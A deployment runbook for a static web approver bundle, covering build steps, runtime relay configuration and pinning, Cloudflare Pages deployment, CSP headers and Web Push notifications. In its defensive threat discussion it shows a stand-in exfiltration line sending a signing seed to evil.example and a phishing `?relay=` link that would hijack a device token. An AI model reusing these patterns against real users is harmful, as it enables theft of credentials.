# Web Approver Deployment Runbook

This runbook covers building and hosting `packages/web-approver`'s production static bundle
(issue #180). Every step a human must run is labelled **[OPERATOR]**. It is a peer of
[`docs/relay-deploy.md`](./relay-deploy.md) — deploy the relay first; the web approver needs a
reachable relay URL to connect to.

> **Thin-shell reminder.** The bundle is a plain static site: HTML/CSS/JS plus the vendored
> `allw-wasm` core. All cryptographic work (decrypt, verify, sign) happens inside that WASM core in
> the browser — the bundle contains no server-side runtime and the host it's deployed to never sees
> plaintext action context or key material (`docs/architecture.md`, `docs/contract.md`).

---

## 1. Build the bundle

**[OPERATOR]** From the repo root:

```sh
pnpm install
pnpm run build:wasm                        # vendors the allw-wasm core (crates/allw-wasm)
pnpm --filter @allw/web-approver build      # tsc, then scripts/build-site.mjs
```

This produces `packages/web-approver/dist-site/`:

```
dist-site/
  index.html                    # copied from public/index.html (no inline script — see §3.1)
  theme.js                      # copied from public/theme.js (light/dark theme bootstrap)
  tokens.css                    # copied from public/tokens.css (vendored design/web-approver/inbox/tokens.css)
  styles.css                    # copied from public/styles.css
  _headers                      # rendered from public/_headers: CSP + security headers (§3.1)
  app.js (+ app.js.map)         # esbuild bundle of src/app.ts
  vendor/allw-wasm/allw_wasm.js
  vendor/allw-wasm/allw_wasm_bg.wasm
```

`dist-site/` is a **flat directory of static files with no server-side dependency and no
Cloudflare-specific runtime API** (`_headers` is a host configuration file, not runtime code — §3.1) — it is hostable on Cloudflare Pages, Netlify, GitHub Pages,
S3+CloudFront, or a plain `npx serve dist-site` for local testing. Cloudflare Pages is the natural
choice alongside the Workers-based relay, but nothing in the bundle requires it.

**Tooling choice — esbuild, not Vite.** The repo's existing tooling taste is plain `tsc` plus small
single-purpose scripts (e.g. `scripts/postbuild-wasm.mjs`); esbuild's JS API is a single function
call from `scripts/build-site.mjs` with no dev-server or plugin ecosystem to introduce, and
esbuild's postinstall lifecycle script is already allow-listed at the workspace root
(`pnpm.onlyBuiltDependencies` in the root `package.json`). Vite would work too, but would add a
config file and a dependency category (a dev-server framework) the workspace doesn't otherwise
need for a single static bundle.

**CI.** `.github/workflows/ci.yml`'s `wasm` job re-runs `pnpm --filter @allw/web-approver build`
immediately after `pnpm run build:wasm` (the `typescript` job's `pnpm -r build` runs before wasm
exists, so the site-bundle step there is a no-op skip — see `scripts/build-site.mjs`'s module doc).
`pnpm -r test` in that same job then exercises `dist-site/` end-to-end: `test/site-build.test.mjs`
serves it over a real `http` server and fetches + instantiates the `.wasm` asset exactly the way a
browser would (`WebAssembly.instantiateStreaming`/`instantiate` against a `fetch()`ed `Response`),
not a Node `fs.readFileSync` shortcut.

---

## 2. Runtime relay configuration (never baked into the bundle)

The same static bundle is deployed once and can be pointed at any relay — self-hosted, staging, or
the hosted `allw-relay` Worker — **without a rebuild**. `src/app.ts` resolves the relay URL, in
priority order (`src/relay-config.ts`):

1. a `?relay=` query-string parameter, e.g.
   `https://approvals.example.com/?relay=https://relay.example.com` — validated (see _HTTPS only_
   below) and persisted to `localStorage` under `allw:relay-url:v1` so a subsequent visit (or a
   home-screen bookmark without the query string) keeps working;
2. a previously-persisted `localStorage` value;
3. neither present → a minimal one-field config prompt is rendered before the pairing gate, so
   first-time visitors without a `?relay=` link can still type in a relay URL by hand.

That order applies **only before pairing**. Once a browser is paired, its relay is pinned (below).

**[OPERATOR] The relay must allow the approver's origin (CORS).** Every relay call the approver
makes is cross-origin, so the relay it talks to must list the origin the bundle is served from
(e.g. `https://approvals.example.com`) in its `CORS_ALLOWED_ORIGINS` var (`docs/relay-deploy.md`
§2). A relay that does not list it answers every preflight with a 403, the browser withholds every
response, and the approver never gets past pairing. This is the relay-side mirror of the CSP
`connect-src` list (§3.1), which must in turn name the relay. The hosted relay
(`allw-relay.mnorth.workers.dev`) admits **only** the hosted approver origin
(`https://allw-web-approver.pages.dev`), so a self-hosted approver needs a relay its operator
controls.

**HTTPS only.** A relay URL is accepted only if it is `https:`, or `http:` on a loopback host
(`localhost` or `127.0.0.1`) for local development against `wrangler dev`, and it carries no
username, password, query (`?`) or fragment (`#`) — userinfo lets a link look like one host while
pointing at another (`https://relay.example.com@evil.example` is `evil.example`). Anything else —
including `http://relay.example.com` — is rejected at configuration time and the config prompt shows
why, so bearer tokens and ciphertext never travel unencrypted. For a local relay use `127.0.0.1`,
not `[::1]`: a CSP cannot list an IPv6 address (§3.1), so the IPv6 loopback is rejected by the web
approver, the SDK, and the site build alike. A path is allowed. The accepted URL is stored in
canonical form: the origin (lowercased, punycode host, default port dropped) plus the path without
trailing slashes. The SDK's `createClient` enforces the same rule;
`packages/sdk/test/fixtures/relay-url-vectors.json` holds the shared accept/reject vectors (issue
#249).

### Relay pinning

Pairing **pins** the relay: the relay URL is stored inside the paired identity (`allw:pairing:v1`,
field `relayUrl`) and every relay call the browser makes afterwards — inbox polling, the `connect`
WebSocket, account-state resolution — goes to that pinned relay.

- **Before pairing**, the pairing screen shows the origin of the relay the browser is about to pin
  (in punycode, so a lookalike internationalized host can't pass as a familiar one), so a relay
  pre-filled by a `?relay=` link is visible before the human commits. Nothing is sent to it until
  pairing completes.
- **After pairing**, a `?relay=` link that differs from the pinned relay is **ignored**: it is not
  persisted and nothing is sent to it, and a notice at the top of the page names the ignored link.
  This closes the phishing path where `…/?relay=https://evil.example` would re-point a paired device
  and hand its `deviceAuthToken` to the attacker's relay.
  - Anyone can send the link, so the notice names it only through the core's `escape_for_display`
    (#307). It shows the link's origin, or for a value that isn't a URL, its first 120 characters.
    Bidi overrides, zero-width and control characters appear as visible escapes such as `⟨U+202E⟩`.
  - The notice appears at once. The name reads "(checking…)" until the core has loaded. If the core
    can't load within 5 seconds (`DISPLAY_ESCAPE_LOAD_TIMEOUT_MS`, #308), the name is withheld
    ("(hidden: the approver core did not load)"), and the notice still says a link was ignored.
  - The pinned relay in the notice is printed as is: `checkRelayUrl` accepts it only in canonical
    form, and its origin is ASCII (punycode for an internationalized host).
- **To change relays**, pair the browser again. "Use another device" on the returning-device screen
  re-pairs against the currently pinned relay; to pin a different relay, clear the site's data for
  the approver origin and open it with the new `?relay=` link.
- **Browsers paired before pinning existed** are bound once, on their next visit, to the relay URL
  they had already persisted (`allw:relay-url:v1`) — never to a `?relay=` link on that visit. If
  none is persisted, the config prompt asks for it.
- **A pin that a later build no longer accepts** (a rejected or non-canonical relay URL in an
  otherwise valid identity) puts the browser in a **re-pair-required** state. The identity is
  unusable (fail-closed: nothing is sent to that relay), but it is not discarded silently. Before
  any relay is resolved or asked for, a screen shows the pinned relay and says why it is rejected.
  The pin is untrusted stored text, so the screen loads the approver core first (the same WASM the
  inbox reuses) and shows the pin only as the core's `escape_for_display` renders it (an empty pin
  as `(empty)`). If the core does not load, or hasn't loaded within 5 seconds
  (`DISPLAY_ESCAPE_LOAD_TIMEOUT_MS`, #308; the core is about 1 MB), the pin is withheld as
  `(hidden: the approver core did not load)`, and the screen still offers the choice below. A core
  that arrives later doesn't change the screen. The stored identity is cleared only when the human chooses **Forget this pairing and
  pair again**, and only if it is still the identity the screen showed: a newer identity saved
  since, for example by another tab, is kept, and the browser routes to it instead. Closing the
  page leaves it in storage. After the confirmation the browser pairs again, but on that re-pair
  visit it is treated as a previously paired browser, like the legacy binding above: a `?relay=`
  link is ignored (the notice names it) and never persisted, and the relay is the one this browser already persisted, or one the human
  enters. For example, browsers pinned to
  `http://[::1]:…` before `[::1]` was dropped land here and re-pair against `http://127.0.0.1:…`.
  Builds that narrow the relay rule or change its canonical form should ship a migration for stored
  pins, or say in their release notes that affected devices must re-pair. An identity that is
  corrupt in any other way (unparseable, a missing field, a non-string pin) is still discarded and
  the browser routed to pairing.

**[OPERATOR]** To hand a user a working link, share the deployed bundle's URL with `?relay=`
appended, pointing at a relay that allows the bundle's origin (above), e.g. a self-hosted pair:

```
https://approvals.example.com/?relay=https://relay.example.com
```

The hosted approver and hosted relay pair up the same way:
`https://allw-web-approver.pages.dev/?relay=https://allw-relay.mnorth.workers.dev`.

---

## 3. Deploy to Cloudflare Pages

**[OPERATOR]**

```sh
cd packages/web-approver
npx wrangler@latest pages deploy dist-site --project-name allw-web-approver
```

The first run prompts for Cloudflare authentication (or reuses `wrangler login` from
`docs/relay-deploy.md` §1 if you've already authenticated for the relay) and creates the
`allw-web-approver` Pages project if it doesn't exist. Wrangler prints the deployed URL, e.g.
`https://allw-web-approver.pages.dev`.

No environment variables, secrets, or build configuration are required on the Pages side — the
bundle is fully static and reads its relay URL at runtime (§2 above). Pages applies the
`dist-site/_headers` file automatically (§3.1).

### 3.1 Response headers and the Content-Security-Policy

`public/_headers` is a
[Cloudflare Pages headers file](https://developers.cloudflare.com/pages/configuration/headers/).
`scripts/build-site.mjs` renders it into `dist-site/_headers`, which sets for every path:

| Header                    | Value                                                                                                                                                                          |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; connect-src 'self' <relay origins>; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'` |
| `X-Content-Type-Options`  | `nosniff`                                                                                                                                                                      |
| `Referrer-Policy`         | `no-referrer`                                                                                                                                                                  |
| `X-Frame-Options`         | `DENY` (legacy companion to `frame-ancestors 'none'`)                                                                                                                          |

Why each part matters: the page holds the device's signing seed in browser storage, so any script
running on the approver origin could forge approvals. `script-src 'self'` with no `'unsafe-inline'`
means only the shipped files run (the theme bootstrap is the external `theme.js`, not an inline
script); `'wasm-unsafe-eval'` allows compiling the vendored allw WASM core and nothing else;
`connect-src` limits fetch, XHR and WebSocket traffic to the page itself and the listed relays,
which blocks exfiltration over those channels; `frame-ancestors 'none'` stops the approver being
framed to clickjack an Approve button.

**What the CSP does not do.** It stops injected inline or third-party script from _running_, and it
blocks fetch/XHR/WebSocket exfiltration. It does **not** stop script that is already running on the
approver origin — for example a compromised dependency bundled into `app.js`, which `'self'` allows —
from leaking data by top-level navigation (`location = "https://evil.example/#" + seed`),
`window.open`, or WebRTC. That residual risk is tracked in `docs/threat-model.md` alongside
hardware-backed key custody (#244).

**[OPERATOR] The relay list is set at build time.** `connect-src` must name every relay the deployed
site will talk to — a relay missing from it is blocked by the browser, even if it is pinned. The
build reads the list from `ALLW_RELAY_ORIGINS` (origins separated by spaces or commas) and emits
each origin in both its `https:` and `wss:` forms. Unset, it defaults to the hosted relay
`https://allw-relay.mnorth.workers.dev`. The relay side must match: each listed relay must allow the
approver's origin in its `CORS_ALLOWED_ORIGINS` (§2, `docs/relay-deploy.md` §2). Self-hosters set
their own:

```sh
ALLW_RELAY_ORIGINS="https://relay.example.com" pnpm --filter @allw/web-approver build
# local development against wrangler dev:
ALLW_RELAY_ORIGINS="http://127.0.0.1:8787" pnpm --filter @allw/web-approver build
```

The build fails, rather than emitting a weaker policy, if an origin is not `https:` (or `http:` on
`localhost`/`127.0.0.1`), its host is not a plain DNS name or IPv4 address (so wildcards such as
`https://*.workers.dev` and CSP syntax such as `;` never reach the header), it uses an IPv6 address
(a CSP host-source cannot express one — use `http://127.0.0.1:8787` for a local relay), it carries a
path, query, fragment or credentials, or a header line would exceed Cloudflare's 2,000 character
limit.

**[OPERATOR] Verify after every deploy:**

```sh
curl -sI https://allw-web-approver.pages.dev/ | grep -iE 'content-security-policy|x-content-type-options|referrer-policy'
```

> **Live deployment.** The hosted web approver is live at
> [https://allw-web-approver.pages.dev](https://allw-web-approver.pages.dev). Point it at the hosted
> relay from any browser (including a phone) with
> `https://allw-web-approver.pages.dev/?relay=https://allw-relay.mnorth.workers.dev` — no install
> required. Redeploys follow the command above; the project name is `allw-web-approver`.

### Alternative: any static host

Since `dist-site/` has no Cloudflare-specific runtime dependency, any static host works instead.
Netlify reads the same `_headers` format; on any other host, configure the §3.1 headers in the
host or CDN yourself — without them the site still works but loses its CSP protections:

```sh
# Netlify
npx netlify-cli deploy --dir=packages/web-approver/dist-site --prod

# A plain S3 bucket (with static-site hosting enabled) + your CDN of choice
aws s3 sync packages/web-approver/dist-site s3://your-bucket/ --delete

# Local smoke test before deploying anywhere
npx serve packages/web-approver/dist-site
```

---

## 4. Smoke check (mobile browser, against a deployed relay)

**[OPERATOR]** This is the step that confirms issue #180's original problem — opening the approver
from a phone — is actually solved. It cannot be automated in CI (it requires a physical device on
a real network and a live relay), so it is a manual post-deploy check:

1. Deploy the relay (`docs/relay-deploy.md`) and note its URL.
2. Deploy the web approver bundle (§3 above) and note its URL.
3. Pair a device against the relay (e.g. `npx --no-install allw-approver pair --relay <RELAY_URL> --label
web-phone`; the account id is derived from the keyfile's account root), noting the printed account id, `device_id`, `device_auth_token`, seeds,
   and device cert — the pairing form on the phone (§5 below) collects these same 7 fields.
4. On a phone, open `<WEB_APPROVER_URL>/?relay=<RELAY_URL>` in the browser.
5. Complete the pairing form with the values from step 3 (this is the same dev-mode
   credential-stub path `packages/approver` uses locally; a QR/deep-link flow that pre-fills these
   fields is tracked separately, see `design/web-approver/onboarding/`).
6. Trigger a request against the paired account (e.g. via the Claude Code hook or
   `allw-approver watch` on another device) and confirm it appears in the phone's inbox, the
   WYSIWYS plaintext renders correctly, and Approve/Deny signs and clears it.

---

## 5. Pairing-identity note

The pairing form (`src/pairing.ts`) collects all 7 fields `ApproverIdentity` requires: `accountId`,
`deviceId`, `deviceEncryptionSeed`, `deviceSigningSeed`, `deviceCert`, `accountRootPubkey`, and
`deviceAuthToken` (the relay bearer token from `docs/relay-api.md` §Pairing — distinct from
`deviceCert`, which chains verdict signatures to the account root rather than authorizing relay
HTTP calls). The stored identity also records the pinned `relayUrl` (§2, _Relay pinning_); that
comes from the relay configuration shown on the pairing screen, not from a form field. A friendlier pairing UX (QR code / deep link that pre-fills these fields instead of
manual entry) is tracked separately and out of scope for this bundling/deploy issue.

---

## 6. Notifications (Web Push)

A paired browser can get a notification when an approval request arrives, so the approver doesn't
need an open tab (#237). It uses the relay's Web Push transport (`docs/relay-api.md` §5).

**What the human sees.** After pairing, a strip above the inbox offers **Enable notifications**.
Enabling it:

1. asks for notification permission (an explicit click; never on page load);
2. fetches the relay's VAPID public key (`GET /.well-known/allw/vapid-public-key`);
3. subscribes with `pushManager.subscribe({ userVisibleOnly: true, applicationServerKey })`;
4. registers the subscription's `endpoint` as the device's only `webpush` token
   (`PUT /{acct}/devices/{device_id}/push-tokens`, the device's own bearer token).

Denied, dismissed, unsupported, "relay has notifications turned off" and failed states are shown
in that strip, with how to fix them. None of them gates the inbox: with the tab open, approving
works exactly as before. On every later load the subscription is checked, and re-registered if its
endpoint changed or it was registered for a previous pairing. A subscription made for a different
relay is dropped, and the human is asked to enable again.

**What a notification says.** Fixed text and, at most, a count: "2 approval requests are waiting."
It never contains a summary, command, actor, cwd or any other request data, and the service worker
never decrypts anything. A wakeup is payload-less, so the worker fetches
`GET /{acct}/devices/{device_id}/inbox` and counts the pending envelopes. It shows a notification on
**every** push: browsers throttle or revoke a subscription whose pushes show nothing (Safari after a
few). When the inbox is already empty (another device answered, the request expired, or the relay
coalesced several submits into one wakeup) it says "An approval request was handled or expired."
When the inbox can't be read, including when the relay doesn't answer within 8 seconds (headers
and body), it says "Open allw approvals to check for approval requests."
Every notification uses one fixed tag (`allw-approvals`) with `renotify`, so repeated wakeups
replace a single notification, which alerts again, instead of stacking. The collapsing has to happen
here: Apple's push service rejects the Web Push `Topic` header, so the relay can't collapse wakeups
for iOS and Safari.
Tapping a notification focuses an open approver window or opens the app; deciding and number-match
still happen only in the full UI, behind the pairing gate.

**What the service worker can read.** A service worker can't read `localStorage`, so on enabling,
the page mirrors exactly four values to IndexedDB (`allw-push`): the pinned relay URL, account id,
device id and `device_auth_token`. The device seeds, device cert and account root key are **never**
mirrored. The token there has the same exposure as the identity in `localStorage`: any script
running on the approver origin can read both (`docs/threat-model.md`).

**Forgetting a pairing.** The mirror is cleared with the pairing. When the identity is forgotten
(**Use another device**, a corrupt identity, a confirmed re-pair) and on any load with a missing or
corrupt identity, the page:

1. reads the mirrored credentials into memory, then deletes both IndexedDB records, so the service
   worker has no token to use;
2. drops the browser's push subscription;
3. asks the relay to clear this device's push tokens (`PUT …/push-tokens` with
   `{ "push_tokens": [] }`, using the token read in step 1). If the mirror was empty or unreadable,
   it uses the token of the identity being forgotten instead, so a registration that another tab
   sent but hadn't yet mirrored is still withdrawn.

Steps 2 and 3 are **best effort**. If the relay call fails (offline, or the token was already
revoked), the relay keeps the endpoint until the device is revoked, or until the push service
answers 404/410 for the dropped subscription and the relay prunes it (`docs/relay-api.md` §5).
Until then, a wakeup can still reach a subscription that wasn't dropped. The worker, which has no
credentials, then shows only "Open allw approvals to check for approval requests."

An identity pinned to a relay this build rejects (§2, _Relay pinning_) is forgotten only when the
human confirms the re-pair. Until then its mirrored credentials stay, but they are inert: the worker
re-validates the relay on every read and makes no call to one this build rejects.

Another tab can forget or replace the pairing while this one shows the strip. The strip checks that
the identity it was mounted for is still the stored one three times: before registering with the
relay, before writing the mirror, and after the write commits. A forget can land between the second
check and the commit; it then finds the mirror empty, and the write lands after it. So whenever a
check fails:

- nothing more is mirrored;
- records this tab already wrote are deleted, each only if it still holds what this tab wrote, so a
  newer pairing's records survive. The compare and the delete run in one IndexedDB transaction;
- a registration already sent is withdrawn with the forgotten device's token (best effort);
- the strip asks for a reload.

One window remains. The checks read `localStorage`, and a browser can propagate another tab's change
to it asynchronously when the tabs run in different processes. A check made in that gap still reads
the old identity, so the strip can end "on" with the forgotten token back in the mirror. The relay
side is still covered: the forget withdrew the registration and dropped the subscription, so the
worker gets no pushes for that token. The leftover record is removed by the next load's forget or
overwritten by a new pairing's mirror.

**Files.** `scripts/build-site.mjs` bundles the worker to `sw.js` at the site root (a worker's scope
can't be wider than its directory), and ships `manifest.webmanifest` (name, `start_url`,
`display: "standalone"`, icons) plus `icons/`. `index.html` links the manifest and an
`apple-touch-icon`. `_headers` serves the manifest as `application/manifest+json` and `sw.js` with
`Cache-Control: no-cache`. The CSP needs no change: `worker-src` and `manifest-src` fall back to
`'self'`, and the worker's relay requests are covered by the same `connect-src` relay list (§3.1).

**[OPERATOR] Requirements.**

- The relay must have Web Push configured (`docs/relay-deploy.md` §3d). Without it the key endpoint
  answers 404 and the strip says the relay doesn't send notifications.
- The relay must answer CORS for the approver's origin. The page and the worker call it
  cross-origin, and the inbox and push-token calls carry an `Authorization` header, so they are
  preflighted.

### iPhone and iPad: install to the Home Screen first

iOS and iPadOS (16.4+) deliver Web Push only to a web app **installed to the Home Screen**. In a
browser tab the strip shows instructions instead of the button: tap **Share**, choose **Add to
Home Screen**, then open allw approvals from the Home Screen and enable notifications there. The
installed app runs standalone, and shows the button. This applies to every iOS browser, since all
of them use WebKit. iPadOS reports a Mac user agent, so it is recognized by touch support.

**[OPERATOR] Manual check.** On a real iPhone: install the approver to the Home Screen, pair it,
enable notifications, then submit a request against the account from another machine. A
notification should arrive with the app closed, say only that a request is waiting, and open the
app when tapped.

---

## Appendix: what this runbook has and has not verified

| Item                                                                          | Status                                                               |
| ----------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| `pnpm --filter @allw/web-approver build` produces a working `dist-site/`      | Verified                                                             |
| `dist-site/` builds without wasm (skips cleanly, `pnpm -r build` still green) | Verified                                                             |
| `.wasm` served with correct content-type and instantiates over real HTTP      | Verified (`test/site-build.test.mjs`)                                |
| Relay URL resolved at runtime (query param / storage / config prompt)         | Verified (`test/relay-config.test.mjs`)                              |
| No literal relay URL embedded in the bundled `app.js`                         | Verified (`test/site-build.test.mjs`)                                |
| `_headers` ships with the CSP directives; `index.html` has no inline script   | Verified (`test/site-build.test.mjs`)                                |
| Relay pinned at pairing; a differing `?relay=` is ignored with a notice       | Verified (`test/app-boot.test.mjs`)                                  |
| The ignored `?relay=` link is shown only core-escaped, or withheld (#307)     | Verified (`test/relay-config.test.mjs`, `test/app-boot.test.mjs`)    |
| HTTPS-only relay URLs (http only on loopback)                                 | Verified (`test/relay-config.test.mjs`, SDK `relay-url-transport`)   |
| CSP does not break WASM load or relay fetch/WebSocket in a real browser       | Verified locally in Chrome against `wrangler dev` (issue #249 PR)    |
| CSP header present on the live Pages deployment (`curl -sI`)                  | **Not run** — post-deploy operator step (§3.1)                       |
| Actual deploy to Cloudflare Pages (or any host)                               | **Not run** — human operator step (§3)                               |
| Mobile-browser smoke test against a live deployed relay                       | **Not run** — human operator step (§4); requires a real device/relay |
| Notification text has no request data; every push shows one (incl. empty)     | Verified (`test/push.test.mjs`)                                      |
| Subscribe flow, re-registration, denied/unsupported/failed states, iOS branch | Verified (`test/push.test.mjs`, injected browser APIs)               |
| Manifest, icons and root-scope `sw.js` bundled                                | Verified (`test/site-build.test.mjs`)                                |
| Subscribe, push → notification, forget, in a real browser against a relay     | Verified locally in Chrome against `wrangler dev` (issue #237 PR)    |
| A notification received on a real iPhone installed to the Home Screen         | **Not run** — human operator step (§6); requires a device and relay  |
